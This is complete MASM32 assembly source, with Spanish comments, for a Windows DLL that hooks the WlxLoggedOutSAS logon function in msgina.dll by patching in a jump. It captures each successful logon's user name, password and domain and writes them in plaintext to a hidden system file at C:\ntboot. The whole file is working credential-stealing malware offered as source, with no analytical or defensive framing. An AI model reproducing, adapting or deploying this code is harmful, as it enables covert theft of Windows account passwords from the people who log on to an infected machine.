.486

.model flat,stdcall

option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\shell32.inc
includelib \masm32\lib\gdi32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\shell32.lib 

Inject proto
DeInject proto
Loggea proto :DWORD, :DWORD, :DWORD

WLX_MPR_NOTIFY_INFO STRUCT
    pszUserName     DWORD 0
    pszDomain       DWORD 0
    pszPassword     DWORD 0
    pszOldPassword  DWORD 0
WLX_MPR_NOTIFY_INFO ENDS

PILA STRUCT
	backup   		  db 32 dup(0) ; PUSHAD
	return   		  dd 0
	pWlxContext		  dd 0
	dwSasType		  dd 0
	pAuthenticationId dd 0
	pLogonSid		  dd 0
	pdwOptions		  dd 0
	phToken			  dd 0
	pNprNotifyInfo 	  dd 0
	pProfile 		  dd 0
PILA ENDS

.const
    WLX_SAS_ACTION_LOGON EQU 1

.data
    dll      db "msgina.dll",0
    ginafunc db "WlxLoggedOutSAS",0
    archivo  db "C:\ntboot",0
    formato	 db "User: %ls Password: %ls Domain: %ls",13,10,0
    ginaptr  dd 0
    oldprot  dd 0
    return   dd 0
    valor    dd 0
    buffer   dd 0
    ptrwlx	 dd 0

.code

DllEntry proc hInstDLL:HINSTANCE, reason:DWORD, reserved1:DWORD 
        .if reason==DLL_PROCESS_ATTACH
            invoke Inject
        .elseif reason==DLL_PROCESS_DETACH
        	invoke DeInject
        .endif
        xor eax, eax
        inc eax
        ret
DllEntry Endp

DeInject proc
	
	; Reescribimos los bytes que tenía
	mov eax, ginaptr
	mov edx, offset original
	mov ebx, dword ptr [edx]
	mov dword ptr [eax], ebx
	add eax, 4
	add edx, 4
	mov bx, word ptr [edx]
	mov word ptr [eax], bx
	; y volvemos a proteger la memoria
    invoke VirtualProtect, ginaptr, 4096, oldprot, addr oldprot
	ret

DeInject endp

Inject proc
    ; Cargamos la DLL Gina
    invoke LoadLibrary, addr dll
    ; Cojemos un puntero a la función de login
    invoke GetProcAddress, eax, addr ginafunc
    mov ginaptr, eax
    ; Hacemos una backup de los 6 primeros bytes
    mov ebx, offset original
    mov edx, dword ptr [eax]
    mov dword ptr [ebx], edx
    ; Guardamos 4 bytes (un dword)
    add eax, 4
    add ebx, 4
    mov dx, word ptr [eax]
    mov word ptr [ebx], dx
    ; y después los otros 2 (un word)
    ; Desprotegemos la memoria
    invoke VirtualProtect, ginaptr, 4096, PAGE_EXECUTE_READWRITE, addr oldprot
    mov eax, ginaptr
    ; Calculamos el desplazamiento
    mov edx, offset GinaHook
    cmp edx, eax
    jg masgrande
    sub edx, eax
    sub edx, 5
    jmp parchea
    masgrande:
    mov ecx, eax
    sub ecx, edx
    mov edx, ecx
    parchea:
    ; Injertamos el opcode del salto
    mov byte ptr [eax], 0E9h
    inc eax
    ; La dirección del salto
    mov dword ptr [eax], edx
    add eax, 4
    ; Y un NOP
    mov byte ptr [eax], 90h
    ret
Inject endp

GinaHook:
	; Lo primero es hacer un backup de los datos que se le pasan a la función
	pushad
	mov eax, esp
	assume eax:PTR PILA
	mov eax, [eax].pNprNotifyInfo
	mov ptrwlx, eax
	mov eax, esp
	assume eax:PTR PILA
	; Una vez hecho esto, guardamos la dirección de retorno y la cambiamos
	; para que vuelva a esta funcion
    push [eax].return
    pop return
    mov [eax].return, offset GinaSigue
    assume eax:nothing
    popad
    mov eax, ginaptr
    add eax, 6
    original db 6 dup(90h)
    jmp eax
    GinaSigue:
    ; Ya se ha procesado el login
    mov valor, eax
    .if eax==WLX_SAS_ACTION_LOGON
        ; Si ha sido un login satisfactorio guardamos los datos
        ;mov eax, offset wlx
        mov eax, ptrwlx
        assume eax:PTR WLX_MPR_NOTIFY_INFO
        invoke Loggea, [eax].pszUserName, [eax].pszPassword, [eax].pszDomain 
        assume eax:nothing
    .endif
    ; Y finalmente ponemos en la pila el valor de retorno, y en eax el valor devuelto por la
    ; funcion real, y retornamos
    mov eax, return
    push eax
    mov eax, valor
    ret
GinaHookEnd:

Loggea proc user:DWORD, password:DWORD, domain:DWORD
	LOCAL hFile:DWORD
	LOCAL filesize:DWORD
	LOCAL mysize:DWORD
	pushad
	invoke GlobalAlloc, GPTR, 400
	mov buffer, eax
	invoke CreateFile, addr archivo, GENERIC_READ + GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM, NULL
	mov hFile, eax
	invoke GetFileSize, hFile, addr filesize
	mov filesize, eax
	invoke SetFilePointer, hFile, filesize, 0, FILE_BEGIN
	invoke wsprintf, buffer, addr formato, user, password, domain
	invoke lstrlen, buffer
	mov mysize, eax
	invoke WriteFile, hFile, buffer, mysize, addr filesize, 0
	invoke CloseHandle, hFile
	invoke GlobalFree, buffer
	mov buffer, 0
	popad
	ret
Loggea endp

End DllEntry
